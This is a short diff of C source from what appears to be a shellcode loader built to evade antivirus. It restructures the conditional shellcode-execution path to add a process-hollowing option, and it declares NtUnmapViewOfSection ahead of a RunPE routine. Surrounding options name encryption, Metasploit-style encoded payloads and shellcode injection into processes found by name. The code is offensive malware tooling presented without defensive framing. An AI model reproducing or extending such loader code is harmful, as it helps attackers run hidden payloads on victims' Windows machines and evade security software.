@@ -93,13 +93,15 @@ int main (int argc, char **argv)
 		buffer = FVALUE;
 	#endif
 
-	#ifndef ENCRYPT
-	#ifndef ASCIIMSF 
-		#ifdef PRINT_DEBUG
-		printf("exec shellcode without decode_shellcode\n");
+	#ifndef PROCESS_HOLLOWING
+		#ifndef ENCRYPT
+			#ifndef ASCIIMSF 
+				#ifdef PRINT_DEBUG
+				printf("exec shellcode without decode_shellcode\n");
+				#endif
+				shellcode = buf;	//buf is from defs.h if shellcode is included
+			#endif
 		#endif
-		shellcode = buf;	//buf is from defs.h if shellcode is included
-	#endif
 	#endif
 	
 	#ifndef INJECT_SHELLCODE
@@ -326,6 +328,8 @@ DWORD get_pid_by_name(char *imgname)
 #endif
 
 #ifdef PROCESS_HOLLOWING
+typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
+
 void newRunPE(LPSTR szFilePath, PVOID pFile)
 {
 	PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
